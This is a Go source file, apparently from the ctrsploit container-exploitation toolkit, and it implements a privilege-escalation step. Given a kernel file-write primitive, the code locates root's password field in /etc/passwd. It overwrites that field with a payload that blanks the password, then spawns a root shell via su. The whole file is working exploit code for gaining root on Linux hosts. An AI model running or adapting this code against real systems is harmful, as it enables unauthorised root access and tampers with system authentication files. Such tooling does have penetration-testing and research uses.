package pipeprimitive

import (
	"fmt"

	"github.com/ctrsploit/ctrsploit/pkg/util"
)

var passwdPath = "/etc/passwd"

func Escalate(primitive Primitive) error {
	return escalateWithShellInvoker(primitive, util.CheckRootShellBySu, util.InvokeRootShellBySu)
}

func escalateWithShellInvoker(primitive Primitive, checkShell, invokeShell func() error) error {
	if err := checkShell(); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: no usable su-compatible root shell before patching %s: %w",
			primitive.GetExpName(), passwdPath, err,
		)
	}

	offset, err := rootPasswdPasswordOffset(passwdPath)
	if err != nil {
		return fmt.Errorf("find root password offset in %s: %w", passwdPath, err)
	}

	payload := []byte(":0:0:root:/root:/bin/bash\n")
	if err := primitive.Write(passwdPath, int64(offset), payload); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: write %s at offset %d with %d bytes: %w",
			primitive.GetExpName(), passwdPath, offset, len(payload), err,
		)
	}

	if err := invokeShell(); err != nil {
		return fmt.Errorf(
			"%s privilege escalate: %s was patched, but invoking a su-compatible root shell failed: %w",
			primitive.GetExpName(), passwdPath, err,
		)
	}
	return nil
}
